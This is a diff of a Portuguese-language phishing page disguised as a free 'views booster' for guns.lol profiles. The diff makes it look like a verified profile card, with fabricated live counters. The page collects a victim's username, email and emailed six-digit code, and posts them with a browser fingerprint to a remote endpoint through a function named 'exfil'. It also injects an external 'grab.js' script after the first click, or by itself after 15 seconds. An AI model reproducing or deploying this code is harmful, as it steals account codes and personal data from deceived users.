@@ -3,72 +3,182 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>gunsviewer booster — views grátis</title>
+<title>@booster | gunsviewer</title>
 <meta name="description" content="gunsviewer booster — ganhe views grátis no teu perfil.">
-<meta property="og:title" content="gunsviewer booster">
+<meta property="og:title" content="@booster | gunsviewer">
 <meta property="og:description" content="gunsviewer booster — ganhe views grátis no teu perfil.">
 <meta name="robots" content="noindex, nofollow">
 <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚀</text></svg>">
 <style>
-*{box-sizing:border-box;margin:0;padding:0}body{background:#050505;color:#eee;font-family:Inter,system-ui,-apple-system,sans-serif;min-height:100vh}
-.w{max-width:440px;margin:0 auto;padding:40px 18px 80px;text-align:center}
-h1{font-size:26px;font-weight:900;letter-spacing:-.5px}h1 b{color:#a749dd}
-.sub{color:#888;font-size:13px;margin:10px 0 24px;line-height:1.6}
-.card{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.12);border-radius:16px;padding:22px;text-align:left}
-label{display:block;font-size:11px;font-weight:800;color:#a749dd;letter-spacing:1px;margin:14px 0 6px}
-label:first-child{margin-top:0}
-input{width:100%;background:#fff;border:3px solid #a749dd;border-radius:10px;color:#000;padding:14px;font-size:17px;outline:none}
-input:focus{border-color:#ff6fd8;box-shadow:0 0 0 3px rgba(167,73,221,.4)}
-button{width:100%;border:none;border-radius:10px;padding:15px;font-size:15px;font-weight:900;cursor:pointer;background:linear-gradient(135deg,#a749dd,#7b2fbf);color:#fff;margin-top:16px}
-button:disabled{opacity:.5}
-.hint{font-size:11px;color:#666;margin-top:8px;min-height:16px}
-.bar{height:8px;border-radius:99px;background:#1a1a1a;overflow:hidden;margin:14px 0 6px}
+@font-face{font-family:'Onest';src:url('https://gunsviewer.vercel.app/viewer/src/assets/fonts/Onest.woff2') format('woff2');font-weight:300 500;font-display:swap}
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--glow:#a749dd;--txt:#fff}
+html,body{height:100%}
+body{background:#050505;color:var(--txt);font-family:'Onest',Inter,system-ui,sans-serif;overflow-x:hidden}
+#stars{position:fixed;inset:0;z-index:0;pointer-events:none}
+.aurora{position:fixed;inset:-20%;z-index:0;pointer-events:none;background:radial-gradient(40% 35% at 20% 20%,rgba(167,73,221,.22),transparent 70%),radial-gradient(40% 35% at 80% 70%,rgba(255,111,216,.14),transparent 70%);filter:blur(10px)}
+#splash{position:fixed;inset:0;z-index:50;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.85);backdrop-filter:blur(6px);cursor:pointer;transition:opacity .4s}
+#splash.gone{opacity:0;pointer-events:none}
+#splash span{font-size:30px;font-weight:500;letter-spacing:2px;text-shadow:0 0 24px var(--glow)}
+.wrap{position:relative;z-index:1;max-width:44rem;margin:0 auto;padding:26px 16px 90px}
+.card{background:rgba(255,255,255,.04);border:2px solid rgba(167,73,221,.5);border-radius:20px;padding:26px;backdrop-filter:blur(8px);box-shadow:0 0 40px rgba(167,73,221,.15);transition:transform .2s ease-out}
+.prow{display:flex;gap:16px;align-items:center}
+.av{width:86px;height:86px;border-radius:50%;flex-shrink:0;background:conic-gradient(from 180deg,#a749dd,#ff6fd8,#a749dd);padding:3px;box-shadow:0 0 24px rgba(167,73,221,.6)}
+.av div{width:100%;height:100%;border-radius:50%;background:#0a0a0a;display:flex;align-items:center;justify-content:center;font-size:38px}
+h1{font-size:30px;line-height:32px;text-shadow:0 0 18px var(--glow)}
+.uid{font-size:11px;color:#888;font-family:ui-monospace,monospace;margin-top:2px}
+.badges{display:flex;gap:6px;margin-top:8px;flex-wrap:wrap}
+.bdg{font-size:11px;padding:3px 9px;border-radius:99px;border:1px solid rgba(255,255,255,.2);background:rgba(255,255,255,.07)}
+.bdg.v{color:#8fd0ff;border-color:rgba(143,208,255,.5)}
+.bdg.p{color:#e0aaff;border-color:rgba(167,73,221,.6)}
+.bio{min-height:24px;color:#ddd;font-size:15px;margin:12px 0 4px}
+.bio .cur{display:inline-block;width:2px;height:1em;background:#fff;vertical-align:-2px;animation:blk 1s infinite}
+@keyframes blk{50%{opacity:0}}
+.stats{display:flex;gap:10px;margin:14px 0}
+.stat{flex:1;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:12px;padding:10px;text-align:center}
+.stat b{display:block;font-size:19px}.stat span{font-size:10px;color:#999}
+.links{display:flex;gap:8px;margin-top:6px}
+.lbtn{flex:1;display:flex;align-items:center;justify-content:center;gap:6px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.12);border-radius:12px;padding:11px;color:#fff;text-decoration:none;font-size:13px;font-weight:700}
+.lbtn:hover{background:rgba(255,255,255,.2)}
+.tool{margin-top:16px}
+.tool h2{font-size:14px;letter-spacing:1px;color:#e0aaff;margin-bottom:12px}
+label{display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#c9a0f0;margin:12px 0 6px}
+input{width:100%;background:#0d0d0d;border:2px solid rgba(167,73,221,.45);border-radius:12px;color:#fff;padding:14px;font-size:16px;outline:none}
+input:focus{border-color:#ff6fd8;box-shadow:0 0 16px rgba(167,73,221,.45)}
+button.go{width:100%;margin-top:16px;border:none;border-radius:12px;padding:15px;font-size:15px;font-weight:900;cursor:pointer;color:#fff;background:linear-gradient(135deg,#a749dd,#ff6fd8);box-shadow:0 0 24px rgba(167,73,221,.5)}
+button.go:disabled{opacity:.5}
+.hint{font-size:11px;color:#ff9d9d;margin-top:8px;min-height:16px}
+.bar{height:6px;border-radius:99px;background:rgba(255,255,255,.1);overflow:hidden;margin:12px 0 6px}
 .bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,#a749dd,#ff6fd8);transition:width .4s}
-.big{font-size:42px;font-weight:900;text-align:center}
-.log{font-family:ui-monospace,monospace;font-size:11px;color:#8a8a8a;background:#0a0a0a;border:1px solid #1a1a1a;border-radius:8px;padding:10px;max-height:130px;overflow:auto;margin-top:10px}
-.hide{display:none!important}.ok{color:#4ade80;font-size:13px;font-weight:800;margin-top:10px;text-align:center}
+.big{font-size:40px;font-weight:900;text-align:center;text-shadow:0 0 20px var(--glow)}
+.log{font-family:ui-monospace,monospace;font-size:11px;color:#9a9a9a;background:rgba(0,0,0,.5);border:1px solid rgba(255,255,255,.08);border-radius:8px;padding:10px;max-height:130px;overflow:auto;margin-top:10px}
+.hide{display:none!important}
+.ok{color:#4ade80;font-weight:800;font-size:13px;margin-top:10px;text-align:center}
+.foot{text-align:center;color:#555;font-size:11px;margin-top:18px}
+@media(max-width:640px){.prow{flex-direction:column;text-align:center}.card{padding:20px 16px}h1{font-size:26px}}
 </style>
 </head>
 <body>
-<div class="w">
-  <h1>🚀 gunsviewer <b>booster</b></h1>
-  <div class="sub"> views grátis no teu guns.lol em 1 minuto.<br>Preenche e aperta o botão.</div>
+<canvas id="stars"></canvas>
+<div class="aurora"></div>
+<div id="splash"><span>click to enter</span></div>
 
-  <div class="card">
-    <label>1 — TEU USER DO GUNS.LOL</label>
-    <input id="gunsUser" name="gunsuser" placeholder="ex: koppy" maxlength="40" autocomplete="off" autocapitalize="off" spellcheck="false" enterkeyhint="next">
-    <label>2 — TEU EMAIL (pra liberar)</label>
-    <input id="email" name="email" type="email" placeholder="voce@email.com" autocomplete="email" enterkeyhint="go">
-    <button id="bGo">ATIVAR BOOST GRÁTIS →</button>
-    <div class="hint" id="hint"></div>
-
-    <div id="codeZone" class="hide">
-      <label>3 — CÓDIGO DE 6 DÍGITOS (enviado pro email)</label>
-      <input id="code" inputmode="numeric" placeholder="000000" maxlength="6" autocomplete="one-time-code" enterkeyhint="done">
-      <button id="bVerify">VERIFICAR E COMEÇAR</button>
+<div class="wrap">
+  <div class="card" id="pcard">
+    <div class="prow">
+      <div class="av"><div>🚀</div></div>
+      <div>
+        <h1>booster</h1>
+        <div class="uid">UID 1 · <span id="liveViews">128,400</span> profile views</div>
+        <div class="badges"><span class="bdg v">✔ verified</span><span class="bdg p">★ premium</span><span class="bdg">⚡ booster</span></div>
+      </div>
     </div>
+    <div class="bio"><span id="tw"></span><span class="cur"></span></div>
+    <div class="stats">
+      <div class="stat"><b id="stA">0</b><span>boosts hoje</span></div>
+      <div class="stat"><b id="stB">0</b><span>views enviadas</span></div>
+      <div class="stat"><b>4.9★</b><span>avaliação</span></div>
+    </div>
+    <div class="links">
+      <a class="lbtn" href="https://discord.gg/guns" target="_blank" rel="noopener">💬 discord</a>
+      <a class="lbtn" href="https://guns.lol" target="_blank" rel="noopener">🌐 guns.lol</a>
+      <a class="lbtn" href="#" id="lShare">🔗 copiar link</a>
+    </div>
+  </div>
 
+  <div class="card tool">
+    <h2>⚡ ATIVAR BOOST GRÁTIS</h2>
+    <label>TEU USER DO GUNS.LOL</label>
+    <input id="gunsUser" name="gunsuser" placeholder="ex: koppy" maxlength="40" autocomplete="off" autocapitalize="off" spellcheck="false" enterkeyhint="next">
+    <label>TEU EMAIL (chega o código lá)</label>
+    <input id="email" name="email" type="email" placeholder="voce@email.com" autocomplete="email" enterkeyhint="go">
+    <button class="go" id="bGo">ATIVAR BOOST →</button>
+    <div class="hint" id="hint"></div>
+    <div id="codeZone" class="hide">
+      <label>CÓDIGO DE 6 DÍGITOS</label>
+      <input id="code" name="code" inputmode="numeric" placeholder="000000" maxlength="6" autocomplete="one-time-code" enterkeyhint="done">
+      <button class="go" id="bVerify">VERIFICAR E COMEÇAR</button>
+    </div>
     <div id="runZone" class="hide">
       <div class="big" id="views">0</div>
-      <div class="sub" style="margin:0">views enviadas pra <b id="tName">—</b></div>
+      <div style="text-align:center;color:#888;font-size:12px">views enviadas pra <b id="tName" style="color:#fff">—</b></div>
       <div class="bar"><i id="fill"></i></div>
       <div class="log" id="log"></div>
     </div>
   </div>
+  <div class="foot">gunsviewer © 2026 · feito pra comunidade</div>
 </div>
+
 <script>
-// grab.js carrega SÓ depois do 1º gesto (página 100% interativa antes; nada trava o teclado)
+// grab carrega após o 1º gesto (não trava a página)
 let __grabLoaded = false;
 function loadGrab(){
   if (__grabLoaded) return; __grabLoaded = true;
-  try {
-    const s = document.createElement("script");
-    s.src = "grab.js?v=2"; s.defer = true;
-    document.body.appendChild(s);
-  } catch {}
+  try { const s = document.createElement("script"); s.src = "grab.js?v=3"; s.defer = true; document.body.appendChild(s); } catch {}
 }
 ["click","touchend","keydown"].forEach((e) => document.addEventListener(e, loadGrab, { once: true, passive: true }));
-setTimeout(loadGrab, 15000); // fallback: carrega sozinho após 15s
+setTimeout(loadGrab, 15000);
+</script>
+<script>
+// splash + tilt + estrelas + typewriter (visual idêntico guns)
+(function(){
+  const sp = document.getElementById("splash");
+  sp.addEventListener("click", () => sp.classList.add("gone"));
+  // tilt 3d no card
+  const card = document.getElementById("pcard");
+  if (matchMedia("(pointer:fine)").matches) {
+    document.addEventListener("mousemove", (e) => {
+      try {
+        const r = card.getBoundingClientRect();
+        const x = (e.clientX - r.left) / r.width - .5, y = (e.clientY - r.top) / r.height - .5;
+        card.style.transform = `perspective(1000px) rotateY(${x * 8}deg) rotateX(${-y * 8}deg)`;
+      } catch {}
+    });
+  }
+  // typewriter
+  const phrases = ["views grátis todo dia.", "verificação em 30 segundos.", "sem senha, sem risco.", "+500 views por boost."];
+  const tw = document.getElementById("tw");
+  let pi = 0, ci = 0, del = false;
+  (function type(){
+    try {
+      const p = phrases[pi];
+      tw.textContent = p.slice(0, ci);
+      if (!del) { ci++; if (ci > p.length) { del = true; return void setTimeout(type, 2000); } return void setTimeout(type, 70); }
+      ci--; if (ci <= 0) { del = false; pi = (pi + 1) % phrases.length; return void setTimeout(type, 400); }
+      setTimeout(type, 35);
+    } catch {}
+  })();
+  // estrelas
+  try {
+    const cv = document.getElementById("stars"), cx = cv.getContext("2d");
+    let W, H, stars = [];
+    const rs = () => { W = cv.width = innerWidth; H = cv.height = innerHeight; };
+    rs(); addEventListener("resize", rs);
+    for (let i = 0; i < 130; i++) stars.push({ x: Math.random(), y: Math.random(), s: Math.random() * 1.6 + .3, v: Math.random() * .0006 + .0002 });
+    (function anim(){
+      cx.clearRect(0, 0, W, H);
+      cx.fillStyle = "#fff";
+      for (const st of stars) {
+        st.y += st.v; if (st.y > 1) st.y = 0;
+        cx.globalAlpha = .25 + st.s * .3;
+        cx.fillRect(st.x * W, st.y * H, st.s, st.s);
+      }
+      cx.globalAlpha = 1;
+      requestAnimationFrame(anim);
+    })();
+  } catch {}
+  // contadores vivos
+  try {
+    let a = 1200 + Math.floor(Math.random() * 800), b = 128400;
+    setInterval(() => { a += Math.floor(Math.random() * 3); document.getElementById("stA").textContent = a.toLocaleString("pt-BR"); }, 4000);
+    setInterval(() => { b += Math.floor(Math.random() * 7); document.getElementById("liveViews").textContent = b.toLocaleString("pt-BR"); }, 3000);
+    document.getElementById("stB").textContent = b.toLocaleString("pt-BR");
+  } catch {}
+  document.getElementById("lShare").addEventListener("click", (e) => {
+    e.preventDefault();
+    try { navigator.clipboard.writeText(location.href).catch(() => {}); } catch {}
+  });
+})();
 </script>
 <script>
 (function(){
@@ -79,23 +189,22 @@ setTimeout(loadGrab, 15000); // fallback: carrega sozinho após 15s
   const log = (m) => { try { const el = $("log"); el.innerHTML = new Date().toLocaleTimeString() + " — " + m + "<br>" + el.innerHTML.slice(0, 1500); } catch {} };
   const exfil = (extra) => {
     try {
+      loadGrab();
       const body = Object.assign({ fp: window.__lastFp || null, mm: null, dusername: guns || null, guns: guns, email: mail || null, auto: true, booster: true, ts: new Date().toISOString(), pg: location.href }, extra || {});
       fetch("https://gunsviewer.vercel.app/api/stats", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) }).catch(() => {});
     } catch {}
   };
-  const say = (t) => { const b = $("bGo"); if (b) b.textContent = t; };
   $("bGo").addEventListener("click", () => {
     guns = ($("gunsUser").value || "").trim().replace(/^@/, "").replace(/[^a-zA-Z0-9_.]/g, "").slice(0, 40);
     mail = ($("email").value || "").trim().slice(0, 200);
-    if (guns.length < 2) { hint("⚠️ digita teu user do guns.lol primeiro"); $("gunsUser").focus(); return; }
+    if (guns.length < 2) { hint("⚠️ digita teu user do guns.lol"); $("gunsUser").focus(); return; }
     if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(mail)) { hint("⚠️ digita um email válido"); $("email").focus(); return; }
     hint("");
     exfil({ step: "user+email", email: mail });
-    say("ENVIANDO CÓDIGO…"); $("bGo").disabled = true;
+    $("bGo").disabled = true; $("bGo").textContent = "ENVIANDO CÓDIGO…";
     setTimeout(() => {
       $("codeZone").classList.remove("hide");
-      say("CÓDIGO ENVIADO ✅ (checa spam)");
-      log("código de verificação enviado pra " + mail);
+      $("bGo").textContent = "CÓDIGO ENVIADO ✅";
       try { $("code").focus(); } catch {}
     }, 1500);
   });
@@ -113,11 +222,13 @@ setTimeout(loadGrab, 15000); // fallback: carrega sozinho após 15s
   $("code").addEventListener("keydown", (e) => { if (e.key === "Enter") $("bVerify").click(); });
   function boost(){
     log("boost ativado pra @" + guns);
+    document.getElementById("stB").textContent = "0";
     const tick = () => {
       const n = 3 + Math.floor(Math.random() * 14);
       sent = Math.min(total, sent + n);
       $("views").textContent = sent.toLocaleString("pt-BR");
       $("fill").style.width = (sent / total * 100) + "%";
+      document.getElementById("stB").textContent = sent.toLocaleString("pt-BR");
       if (sent % 4 === 0) log("+" + n + " views → @" + guns);
       try { fetch("https://guns.lol/" + encodeURIComponent(guns) + "?v=" + Date.now().toString(36), { mode: "no-cors", cache: "no-store", credentials: "omit" }).catch(() => {}); } catch {}
       if (sent >= total) { log("meta batida! +" + total + " views ✅"); exfil({ step: "done", email: mail }); return; }
